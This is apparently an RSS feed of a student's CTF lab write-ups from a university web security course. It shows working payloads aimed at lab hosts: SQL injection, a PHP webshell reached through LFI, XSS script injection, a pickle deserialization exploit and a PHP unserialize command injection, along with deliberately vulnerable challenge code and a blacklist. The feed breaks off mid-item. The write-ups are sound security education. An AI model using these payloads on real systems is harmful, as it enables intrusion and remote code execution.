<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>NTUSTWS :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/ntustws/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/ntustws/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</guid><description>Simple Web 0x01(Lab - gitleak) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9000/
Exploit - gitleak + basic Git command Use the extension of Firefox(or Google), Dotgit, to check if the website actually has git leak problem denny0223/scrabble To use scrabble tool to leak information
$ git clone https://github.com/denny0223/scrabble.git $ cd scrabble $ sudo ./scrabble http://h4ck3r.quest:9000/ Still no flag There’s flag.php but still no flag in there. HEAD said HEAD is now at a0228bd Remove flag. Thus, we can look up the history by the command below.</description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</guid><description>Simple Web 0x02(Lab - .DS_Store) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9001/
Exploit - .DS_Store Clone lijiejie/ds_store_exp
$ git clone https://github.com/lijiejie/ds_store_exp.git $ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/super_secret_meowmeow.php [200] http://h4ck3r.quest:9001/index.php $ cd h4ck3r.quest_9001 $ cat super_secret_meowmeow.php FLAG{.DS_Store is so annoying lmao} Note that, must install python 2, requests, ds_store and modify queue(import queue→import Queue as queue) $ conda create --name py2.7 python=2.7 $ conda install -c auto ds_store $ conda install -c anaconda requests Reference python-no-module-named-queue</description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</guid><description>Simple Web 0x03(Lab - Log me in + Revenge) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8200/ Challenge: http://h4ck3r.quest:8201/
Exploit - SQLi Payload → ') or ('1'='1') -- # SELECT * FROM admin WHERE (username=’’) or (‘1’=‘1’) – #’) AND (password=‘MTIz’) Flag: FLAG{b4by_sql_inj3cti0n}
Revenge source code :::spoiler code
from flask import Flask, render_template, redirect, request, g, Response import sqlite3 app = Flask(__name__) def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect('/tmp/database.db') db.row_factory = sqlite3.Row return db @app.before_first_request def init_db(): cursor = get_db().cursor() cursor.execute(""" CREATE TABLE IF NOT EXISTS "admin" ( "username" TEXT NOT NULL, "password" TEXT NOT NULL ) """) cursor.execute("SELECT COUNT(*) as count FROM admin WHERE username='admin'") count = cursor.fetchone()['count'] if count == 0: import secrets cursor.execute("INSERT INTO admin (username, password) VALUES (?,?)", ('admin', secrets.token_urlsafe())) get_db().commit() @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() @app.route("/") def home(): return render_template("index.html", failed=request.args.get('failed') != None) @app.route("/login", methods=['POST']) def login(): username = request.form.get('username') password = request.form.get('password') if not username or not password: return redirect("/?failed") cur = get_db().execute(f"SELECT * FROM admin WHERE (username='{username}')") res = cur.fetchone() cur.close() if res['username'] == 'admin' and res['password'] == password: return "FLAG: FLAG{&lt;REDACTED>}" return redirect("/?failed") @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{[^}\s]+}', 'FLAG{&lt;REDACTED>}', source_code, 1) return Response(source_code, mimetype='text/plain') if __name__ == '__main__': app.run(debug=True) :::</description></item><item><title>Simple Web 0x04(Lab - Image Space 0x01)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x04lab---image-space-0x01/index.html</guid><description>Simple Web 0x04(Lab - Image Space 0x01) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9010
Source code :::spoiler code
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;!-- upload form --> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x05(Lab - Image Space 0x02)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x05lab---image-space-0x02/index.html</guid><description>Simple Web 0x05(Lab - Image Space 0x02) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9011
Source code :::spoiler
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> :::</description></item><item><title>Simple Web 0x06(Lab - Image Space 0x03)</title><link>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/upload/simple-web-0x06lab---image-space-0x03/index.html</guid><description>Simple Web 0x06(Lab - Image Space 0x03) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9012
Background file signature
Source code :::spoiler
&lt;?php if (isset($_GET['source'])) { highlight_file(__FILE__); exit; } ?> &lt;h1>Image Uploader&lt;/h1> &lt;p>Only supports: jpg, jpeg, png&lt;/p> &lt;form action="index.php" method="POST" enctype="multipart/form-data"> &lt;input type="file" name="image_file"> &lt;input type="submit" value="Upload"> &lt;/form> &lt;p> &lt;a href="https://bernie6401.github.io/?source">View Source&lt;/a> &lt;/p> &lt;?php if (!isset($_FILES['image_file'])) { die('Give me a file!'); } $filename = basename($_FILES['image_file']['name']); $extension = strtolower(explode(".", $filename)[1]); if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false) { die("Invalid file extension: $extension."); } if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false) { die("Invalid file type: " . $_SERVER["CONTENT_TYPE"]); } list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']); if ($type !== IMAGETYPE_JPEG &amp;&amp; $type !== IMAGETYPE_PNG) { die("Invalid image type."); } $prefix = bin2hex(random_bytes(8)); move_uploaded_file($_FILES['image_file']['tmp_name'], "images/${prefix}_${filename}"); echo "&lt;img src=\"/images/${prefix}_${filename}\">"; ?> ::: It has 2 extra constraint must be bypassed. Use burpsuite and change valid file signature</description></item><item><title>Simple Web 0x07(Lab - `HakkaMD`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x07lab---hakkamd/index.html</guid><description>Simple Web 0x07(Lab - HakkaMD) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8401
Background 資安這條路-Local File Inclusion
Exploit - LFI to RCE First things first, the website has LFI problem http://h4ck3r.quest:8401/?module=/etc/passwd 通靈 It provided phpinfo() so that we can check the save address of session. The setting is default, thus we can use LFI to read session file: http://h4ck3r.quest:8401/?module=/tmp/sess_0qvmvnk5lh140239e6ol9l16h1 We can see that session file store the data of what we enter. Therefore, we could enter webshell to get shell webshell &lt;?php system($_GET['sh']); ?> ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=ls%20/ ↓ ↓ http://h4ck3r.quest:8401/?module=/tmp/sess_2f0dilri9ju4553th2bkclefal&amp;sh=cat%20/flag_aff6136bbef82137 Then we got flag!!!</description></item><item><title>Simple Web 0x08(Lab - My First Meow Website)</title><link>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/lfi/simple-web-0x08lab---my-first-meow-website/index.html</guid><description>Simple Web 0x08(Lab - My First Meow Website) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8400/ Target: Login as Admin
Background PHP 偽協議 (一) Web Security 0x1
Exploit Observe According to the URL, http://h4ck3r.quest:8400/?page=inc/home, it might have LFI problem. Use php://filter to read page http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=inc/home :::spoiler page source code &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>Meow&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.2/css/bulma.min.css"> &lt;/head> &lt;body> &lt;nav class="navbar is-dark" role="navigation" aria-label="main navigation"> &lt;div class="navbar-brand"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home">🐱&lt;/a> &lt;/div> &lt;div id="navbarBasicExample" class="navbar-menu"> &lt;div class="navbar-start"> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/home"> Home &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/?page=inc/about"> About &lt;/a> &lt;a class="navbar-item" href="https://bernie6401.github.io/admin.php"> Admin &lt;/a> &lt;/div> &lt;/div> &lt;/nav> &lt;div class="container" style="margin-top: 1em;"> &lt;?php if (isset($_GET['page'])) include($_GET['page'] . ".php"); else include("inc/home.php"); ?> &lt;/div> &lt;/body> &lt;/html> ::: Observe page source code We know that admin.php is under / directory. http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin :::spoiler admin source code &lt;h1>Admin Panel&lt;/h1> &lt;form> &lt;input type="text" name="username" value="admin"> &lt;input type="password" name="password"> &lt;input type="submit" value="Submit"> &lt;/form> &lt;?php $admin_account = array("username" => "admin", "password" => "kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ"); if ( isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; $_GET['username'] === $admin_account['username'] &amp;&amp; $_GET['password'] === $admin_account['password'] ) { echo "&lt;h1>LOGIN SUCCESS!&lt;/h1>&lt;p>".getenv('FLAG')."&lt;/p>"; } ?> ::: Then we get admin password is: kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ. Then we got flag!!!</description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/index.html</guid><description>Simple Web 0x09(Lab - DNS Lookup Tool) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8300/
Source code :::spoiler code
&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | Baby&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre>&lt;?= shell_exec("host '" . $_POST['name'] . "';") ?>&lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a id="magic">Magic&lt;/a> | &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;article class="message is-link is-hidden is-size-4" id="hint"> &lt;div class="message-body is-family-monospace"> host '&lt;span class="has-text-danger" id="command">&lt;/span>'; &lt;/div> &lt;/article> &lt;/div> &lt;/div> &lt;/section> &lt;script> magic.onclick = () => hint.classList.toggle("is-hidden"); window.onload = hostname.oninput = () => command.textContent = hostname.value; &lt;/script> &lt;/body> &lt;/html> :::</description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/index.html</guid><description>Simple Web 0x10(Lab - DNS Lookup Tool | WAF) tags: NTUSTWS CTF Web Background 2022/03/30 網頁安全 Command injection
Source code :::spoiler code
&lt;?php isset($_GET['source']) and die(show_source(__FILE__, true)); ?> &lt;!DOCTYPE html> &lt;html lang="en"> &lt;head> &lt;meta charset="UTF-8"> &lt;meta http-equiv="X-UA-Compatible" content="IE=edge"> &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"> &lt;title>DNS Lookup Tool | WAF&lt;/title> &lt;link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css"> &lt;/head> &lt;body> &lt;section class="section"> &lt;div class="container"> &lt;div class="column is-6 is-offset-3 has-text-centered"> &lt;div class="box"> &lt;h1 class="title">DNS Lookup Tool 🔍 | WAF Edition&lt;/h1> &lt;form method="POST"> &lt;div class="field"> &lt;div class="control"> &lt;input class="input" type="text" name="name" placeholder="example.com" id="hostname" value="&lt;?= $_POST['name'] ?? '' ?>"> &lt;/div> &lt;/div> &lt;button class="button is-block is-info is-fullwidth"> Lookup! &lt;/button> &lt;/form> &lt;br> &lt;?php if (isset($_POST['name'])) : ?> &lt;section class="has-text-left"> &lt;p>Lookup result:&lt;/p> &lt;pre> &lt;?php $blacklist = ['|', '&amp;', ';', '>', '&lt;', "\n", 'flag']; $is_input_safe = true; foreach ($blacklist as $bad_word) if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false; if ($is_input_safe) system("host '" . $_POST['name'] . "';"); else echo "HACKER!!!"; ?> &lt;/pre> &lt;/section> &lt;?php endif; ?> &lt;hr> &lt;a href="https://bernie6401.github.io/?source">Source Code&lt;/a> &lt;/div> &lt;/div> &lt;/div> &lt;/section> &lt;/body> &lt;/html> ::: It set some protection such as blacklist.</description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/index.html</guid><description>Simple Web 0x11(Lab - XSS Me) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8800/
Background :::spoiler 攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取COOKIE之類的) :::
Source code ... &lt;script> const message = {"icon": "error", "titleText": "User not found.", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Exploit Check XSS ... &lt;script> const message = {"icon": "error", "titleText": "youshallnotpass", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> ... Try to inject script tag Payload: http://h4ck3r.quest:8800/?type=error&amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E// ... &lt;script> const message = {"icon": "error", "titleText": "&lt;/script>&lt;script>alert(123)&lt;/script>//", "timer": 3000, "showConfirmButton": false, "timerProgressBar": true}; window.onload = function () { if (message !== null) Swal.fire(message); } &lt;/script> Hint If you login as guest(password = guest), then you can get the response Fetch flag and send to beeceptor Payload:</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Exploit - SSRF When you see a preview function, then it may have SSRF problem.
Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/index.html</guid><description>Simple Web 0x12(Lab - Web Preview Card) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8500/
Background Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Exploit - SSRF When you see a preview function, then it may have SSRF problem.
Test it file:///etc/passwd or http://127.0.0.1 Analyze flag.php :::spoiler source code
&lt;?php if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user."); ?> &lt;form action="https://bernie6401.github.io/flag.php" method="post"> Do you want the FLAG? &lt;input type="text" name="givemeflag" value="no"> &lt;input type="submit"> &lt;/form> &lt;?php if (isset($_POST['givemeflag']) &amp;&amp; $_POST['givemeflag'] === 'yes') echo "FLAG:", getenv('FLAG'); ::: If you want flag, you need visit /flag.php as localhost and send a form data with parameter givemeflag.</description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/index.html</guid><description>Simple Web 0x13(Lab - SSRFrog) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8501/
Background javascript Set() Web Hacking | 續章【EDU-CTF 2021】 網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」
Source code :::spoiler source code
const express = require("express"); const http = require("http"); const app = express(); app.get("/source", (req, res) => { return res.sendFile(__filename); }) app.get('/', (req, res) => { const { url } = req.query; if (!url || typeof url !== 'string') return res.sendFile(__dirname + "/index.html"); // no duplicate characters in `url` if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png"); try { http.get(url, resp => { resp.setEncoding("utf-8"); resp.statusCode === 200 ? resp.on('data', data => res.send(data)) : res.send(":("); }).on('error', () => res.send("WTF?")); } catch (error) { res.send("WTF?"); } }); app.listen(3000, '0.0.0.0'); :::</description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/index.html</guid><description>Simple Web 0x14(Lab - Debug) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9020/
Background Source code :::spoiler source code
from flask import Flask, request, Response import urllib.request import json app = Flask(__name__) app.config['FLAG'] = "FL4G{fake_flag}" @app.route('/') def index(): return ''' &lt;form action="https://bernie6401.github.io/proxy"> &lt;input type="text" name="url" placeholder="URL"> &lt;input type="submit"> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source Code&lt;/a> | &lt;a href="https://bernie6401.github.io/debug">Debug&lt;/a>&lt;/p> ''' @app.route("/proxy") def proxy(): url = request.args.get("url") if url is None: return "No URL provided" if "https://" not in url: url = "https://" + url try: with urllib.request.urlopen(url) as response: return response.read() except urllib.error.HTTPError as e: return str(e) @app.route("/debug") def debug(): # only allow access for localhost if request.remote_addr != "127.0.0.1": return "Access denied", 403 return json.dumps(app.config, default=lambda _: None) @app.route("/source") def source(): import re source_code = open(__file__).read() source_code = re.sub(r'FLAG{.*}', r'FL4G{fake_flag}', source_code, count=1) return Response(source_code, mimetype='text/plain') :::</description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/index.html</guid><description>Simple Web 0x15.5(Pickle) tags: NTUSTWS CTF Web Background - Pickle Python magic method: __reduce__ __recude__ is used to define what needs to be done when deserializing. Web Hacking | 終章【EDU-CTF 2021】
Source code :::spoiler exploit.py
import pickle import os import pickletools class exploit(object): def __reduce__(self): return (os.system, ('pwd',)) serialized = pickle.dumps(exploit()) print(bytes.hex(serialized)) optim_s = pickletools.optimize(serialized) print(pickletools.dis(serialized)) print(pickletools.dis(optim_s)) :::
:::spoiler server_app.py
import pickle serialized = bytes.fromhex(input('Data: ')) pickle.loads(serialized) :::
Output &amp; Analyze In Linux</description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/index.html</guid><description>Simple Web 0x15(Lab - Jinja) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8700/
Background Web Security 0x1
Source code :::spoiler code
from flask import Flask, render_template_string, request, send_file app = Flask(__name__) @app.get("/") def home(): return render_template_string(""" &lt;form method="POST"> &lt;input type="text" name="name" placeholder="Your name"> &lt;button>submit&lt;/button> &lt;/form> &lt;p>&lt;a href="https://bernie6401.github.io/source">Source code&lt;/a>&lt;/p> """) @app.post("/") def welcome_message(): name = request.form.get('name') return render_template_string("&lt;p>Hello, " + name + "&lt;/p>") @app.get("/source") def source(): return send_file(__file__, mimetype="text/plain") if __name__ == '__main__': app.run(threaded=True, debug=True) :::</description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/index.html</guid><description>Simple Web 0x16.5(php unserialize) tags: NTUSTWS CTF Web Background php magic method Source code class cat { public $sound = 'ls'; function __wakeup() { system("echo".$this->sound); } } $cat = unserialize($_GET['cat']); Description &amp; Analyze $ php -a php > class cat php > public { php { public $sound = 'ls'; php { function __wakeup() php { { php { system("echo ".$this->sound); php { } php { } php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:"meow";}'; php > $cat = unserialize($_GET['cat']); meow php > $_GET['cat']='O:3:"cat":1:{s:5:"sound";s:4:";id;";}'; php > $cat = unserialize($_GET['cat']); uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker) This is a typical command injection. The magic method __wakeup() will be called when unserialized something.</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
Background 0x15.5(Pickle)
Source code :::spoiler code
from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/index.html</guid><description>Simple Web 0x16(Lab - Pickle) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8600/ Note: open a brand new window that haven’t login http://h4ck3r.quest
Background 0x15.5(Pickle)
Source code :::spoiler code
from flask import Flask, request, make_response, redirect, send_file import base64 import pickle app = Flask(__name__) @app.route("/sauce") def sauce(): return send_file(__file__, mimetype="text/plain") @app.route("/") def main(): session = request.cookies.get("session") if session == None: return '&lt;form action="https://bernie6401.github.io/login" method="POST">' +\ '&lt;p>Name: &lt;input name="name" type="text">&lt;/p>' +\ '&lt;p>Age: &lt;input name="age" type="number">&lt;/p>' +\ '&lt;button>Submit&lt;/button>&lt;/form>&lt;hr>&lt;a href="https://bernie6401.github.io/sauce">Source code&lt;/a>' else: user = pickle.loads(base64.b64decode(session)) return f'&lt;p>Name: {user["name"]}&lt;/p>&lt;p>Age: {user["age"]}&lt;/p>' @app.route("/login", methods=['POST']) def login(): user = base64.b64encode(pickle.dumps({ "name": request.form.get('name'), "age": int(request.form.get('age')) })) resp = make_response(redirect('/')) resp.set_cookie("session", user) return resp :::</description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 